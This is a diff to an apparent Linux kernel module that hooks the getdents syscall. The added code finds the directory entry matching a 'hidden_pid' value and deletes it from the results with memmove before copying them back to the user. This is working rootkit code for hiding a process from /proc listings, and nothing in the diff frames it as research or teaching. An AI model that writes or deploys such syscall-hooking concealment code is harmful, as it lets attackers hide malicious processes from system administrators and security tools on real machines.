@@ -51,6 +51,8 @@ static int lkm_syscall_getdents(unsigned int fd,
     int ret, offset;
     struct linux_dirent *loc_dirp, *dir;
     char *offset_buffer;
+    void *dest, *src;
+    size_t move_amt;
 
     ret = ((getdents)original_syscall_getdents)(fd, dirp, count);
 
@@ -65,7 +67,21 @@ static int lkm_syscall_getdents(unsigned int fd,
         offset_buffer = ((char*)loc_dirp) + offset;
         dir = (struct linux_dirent *)offset_buffer;
         printk("%s: local_dirp[i] = %s\n", TAG, dir->d_name);
-        offset += dir->d_reclen;
+
+        if (strcmp(hidden_pid, dir->d_name) == 0) {
+            printk("%s: Match to hidden pid %s found", TAG, hidden_pid);
+            ret -= dir->d_reclen;
+            dest = (void *)offset_buffer;
+            src = (void *)(offset_buffer + dir->d_reclen);
+            move_amt = ret - offset;
+            memmove(dest, src, move_amt);
+        } else {
+            offset += dir->d_reclen;
+        }
+    }
+
+    if (copy_to_user(dirp, buffer, ret)) {
+        return -EFAULT;
     }
 
     return ret;
